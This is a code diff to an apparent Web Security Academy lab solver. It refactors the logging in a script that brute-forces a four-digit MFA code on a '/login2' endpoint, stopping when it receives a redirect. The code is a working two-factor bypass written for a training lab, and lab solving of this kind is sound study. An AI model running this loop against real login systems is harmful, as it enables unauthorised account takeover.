@@ -1,4 +1,4 @@
-from web_security_academy.core.logger import logger
+from web_security_academy.core.logger import logger, NoNewline
 from bs4 import BeautifulSoup
 
 
@@ -15,17 +15,17 @@ def solve_lab(session):
     session.get_path("/login2")
 
     logger.info("Brute-forcing the security code... (Range: 0000 - 1999)")
-    logger.toggle_newline()
-    for i in range(2000):
-        data = {"mfa-code": f"{i:04d}"}
-        resp = session.post_path("/login2", data=data, allow_redirects=False)
 
-        if resp.status_code != 302:
-            logger.info(f"{i:04d} => Incorrect")
+    with NoNewline():
+        for i in range(2000):
+            data = {"mfa-code": f"{i:04d}"}
+            resp = session.post_path("/login2", data=data, allow_redirects=False)
+
+            if resp.status_code != 302:
+                logger.info(f"{i:04d} => Incorrect")
+            else:
+                logger.success(f"{i:04d} => Correct!")
+                session.post_path("/login2", data=data)
+                break
         else:
-            logger.success(f"{i:04d} => Correct!")
-            session.post_path("/login2", data=data)
-            break
-    else:
-        logger.failure("Unable to brute-force security code.")
-    logger.toggle_newline()
+            logger.failure("Unable to brute-force security code.")
